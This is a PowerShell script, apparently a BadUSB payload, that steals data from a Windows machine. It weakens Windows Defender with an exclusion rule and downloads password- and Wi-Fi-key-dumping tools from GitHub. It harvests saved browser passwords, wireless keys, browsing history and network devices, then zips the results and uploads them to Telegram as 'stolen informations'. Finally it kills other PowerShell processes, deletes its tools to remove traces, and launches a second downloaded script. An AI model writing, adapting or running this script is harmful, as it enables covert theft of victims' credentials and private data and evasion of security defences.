# This script was made by Darknight :-)
Set-Location C:\Users\Public\Documents 
Add-MpPreference -ExclusionExtension exe -Force 
mkdir dump
# Downloading the files
Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/upload/fin_upload.ps1 -OutFile fin_upload.ps1 
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe 
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
Invoke-WebRequest https://github.com/Darkinght-ops/Harissa/raw/refs/heads/main/telegram_uploader.exe -OutFile telegram_uploader.exe
# Data Gathering
.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt 
.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt 
.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt 
.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt 
Start-Sleep -Seconds 60 
#Extracting data + Compress it
Move-Item -Path "$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt" -Destination dump/
Compress-Archive dump/ dump.zip 
./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations !" 
Start-Sleep -Seconds 15 #Wait 15 seconds
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process 
Start-Sleep -Seconds 30 
#Remove trace
Remove-Item BrowsingHistoryView.exe
Remove-Item WNetWatcher.exe
Remove-Item WNetWatcher.cfg
Remove-Item WirelessKeyView.exe
Remove-Item WebBrowserPassView.exe
Remove-Item Harissa_upload.ps1
Remove-Item telegram_uploader.exe
#Enable and disable capslock to know when I can eject BadUSB
$keyBoardObject = New-Object -ComObject WScript.Shell
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Start-Sleep -Seconds 1 #Wait 2 seconds
$keyBoardObject.SendKeys("{CAPSLOCK}")
Remove-MpPreference -ExclusionExtension exe -Force 
powershell.exe -noexit -file fin_upload.ps1 # I can use -windowstyle hidden
exit #End .ps1 file
